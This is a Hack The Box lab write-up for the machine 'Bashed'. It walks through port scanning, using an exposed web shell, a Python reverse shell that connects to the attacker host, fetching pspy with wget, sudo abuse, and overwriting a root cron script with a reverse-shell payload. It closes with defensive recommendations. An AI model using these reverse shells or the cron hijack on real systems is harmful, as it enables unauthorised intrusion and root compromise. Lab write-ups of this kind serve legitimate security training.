# Bashed - Hack The Box Writeup

## Overview

Bashed is an easy-rated Linux machine from Hack The Box that focuses on web application vulnerabilities and privilege escalation through cron jobs. This writeup documents the complete penetration testing process from initial reconnaissance to root access.

---

## Reconnaissance

### Target Information
```bash
export target=10.129.15.19
```

<img width="281" height="63" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />


### Network Scanning

#### Initial TCP Port Scan
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="733" height="207" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />

**Results:**
- Port 80/tcp open - HTTP service

#### Service Version Detection
```bash
sudo nmap -sC -sV -p 80 -T4 $target
```

<img width="760" height="254" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />

**Detailed Results:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

---

## Web Enumeration

### Website Analysis
Visiting `http://10.129.15.19` reveals a development website with limited functionality.

<img width="952" height="987" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />

### Directory Brute Forcing
```bash
gobuster dir -u http://10.129.15.19 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,txt,html -t 50 2>/dev/null
```

<img width="962" height="612" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />

**Discovered Directories:**
- `/dev/` - Development directory containing sensitive files

### Key Discovery
Visiting `http://10.129.15.19/dev/` reveals two files:
- `phpbash.php` - Web-based shell interface

<img width="585" height="376" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />

---

## Initial Access

### Web Shell Exploitation
Accessing `http://10.129.15.19/dev/phpbash.php` provides direct command execution capability.

<img width="490" height="134" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />

### Reverse Shell Establishment
```bash
# On attacker machine
nc -nlvp 4444

# Through phpbash.php
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.172",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

<img width="1209" height="134" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />

### Shell Stabilization
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset
export TERM=xterm
```

<img width="503" height="274" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />

<img width="600" height="423" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />

---

## Privilege Escalation

### User Enumeration
```bash
sudo -l
```

<img width="777" height="171" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />

**Output:**
```
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### Lateral Movement to Scriptmanager
```bash
sudo -u scriptmanager bash
```
<img width="593" height="425" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />


### File System Discovery
```bash
cd /scripts
ls -la
```
**Contents:**
```
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov  8 04:25 test.txt
```

### Script Analysis
**test.py:**
```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

### Process Monitoring with pspy

<img width="595" height="164" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />

```bash
# Transfer pspy to target
wget http://10.10.14.172/pspy32 -O /tmp/pspy32
chmod +x /tmp/pspy32
./pspy32
```

<img width="878" height="75" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />

**Critical Finding:**
```
2025/11/08 04:34:01 CMD: UID=0 PID=1342 | python test.py
```

The `test.py` script is executed as root via a cron job.

---

## Root Access

### Reverse Shell Payload
Replace `test.py` with a reverse shell payload:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.172",9004))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

### Root Shell Capture
```bash
# On attacker machine
nc -nlvp 9004
```

Wait for the cron job to execute (less than 1 minute).

### Proof of Compromise
```bash
# Root shell commands
id
whoami
hostname
cat /home/arrexel/user.txt
cat /root/root.txt
```

<img width="524" height="340" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />

**Flags:**
- **User Flag:** `b4c1d0d2f93c0b4000e10fcc01e04082`
- **Root Flag:** `69de10cef65949ccf5e209909a66319c`

---

## Attack Summary

1. **Reconnaissance**: Discovered HTTP service on port 80
2. **Web Enumeration**: Found `/dev/phpbash.php` web shell
3. **Initial Access**: Established reverse shell through web shell
4. **Privilege Escalation**: 
   - Abused sudo permissions to become scriptmanager
   - Discovered root-executed cron job
   - Replaced Python script with reverse shell payload
5. **Root Access**: Gained root shell via cron job execution

---

## Security Recommendations

1. **Remove Development Files**: Delete `phpbash.php` and other development tools from production environments
2. **Principle of Least Privilege**: Review and restrict sudo permissions
3. **Cron Job Security**: Ensure cron jobs don't execute user-writable scripts as root
4. **Regular Audits**: Conduct periodic security assessments of file permissions and cron jobs

---

## Tools Used

- **nmap**: Network scanning and service enumeration
- **gobuster**: Directory brute forcing
- **netcat**: Reverse shell handling
- **pspy**: Process monitoring without root privileges

---

<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>****
